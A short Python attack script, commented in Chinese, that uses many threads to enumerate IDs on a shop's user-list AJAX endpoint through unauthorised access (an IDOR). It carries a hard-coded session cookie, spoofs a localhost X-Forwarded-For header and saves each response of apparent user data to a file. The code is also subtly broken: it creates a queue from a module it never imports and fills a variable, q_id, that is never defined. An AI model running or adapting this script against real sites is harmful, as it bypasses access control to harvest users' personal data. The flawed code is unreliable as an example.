#!/usr/bin/env python3
# encoding:utf8
import re
import sys
import requests
from threading import Thread

"""
多线程进行遍历爬取,用于越权遍历某id
"""

# 兼容py2和py3
if sys.version_info.major == 2:
    from Queue import Queue
else:
    from queue import Queue

q_number = queue.Queue()

for x in range(1, 370):
    q_id.put(x)


# 添加正则
def rer():
    pass


def save(text):
    with open('user.txt', 'a') as f:
        f.write(text + '\n')


def do(id):
    cookies = {"PHPSESSID": "ijo4gqc8l6aisqhq54gdv3t1e0", "acw_tc": "0bc159a315681699881804991e319a4b19325c253ed0803ced01ec4c102c89"}

    headers = {"Accept": "*/*", "Origin": "http://www.zouziqinag.cn", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3809.132 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Referer": "http://xxx.com/shop/User/index", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7", "x-forwarded-for": "127.0.0.1", "Connection": "close"}

    data = {"mobile": '', "user_id": '', "order_by": "user_id", "sort": "desc"}


    url = "http://www.xxx.com/shop/user/ajaxindex/p/{0}".format(id)

    sys.stdout.write('\r{0} '.format(id))
    sys.stdout.flush()

    try:
        r = requests.post(url, headers=headers, cookies=cookies, data=data)
        save(r.text)
    except Exception as e:
        print(e)
        pass


def scan():
    while not q_id.empty():
        do(q_id.get())


def main():
    threads_list = []
    threads = 15

    for i in range(threads):
        t = Thread(target=scan)
        t.start()
        threads_list.append(t)
    for i in range(threads):
        threads_list[i].join()


if __name__ == '__main__':
    main()



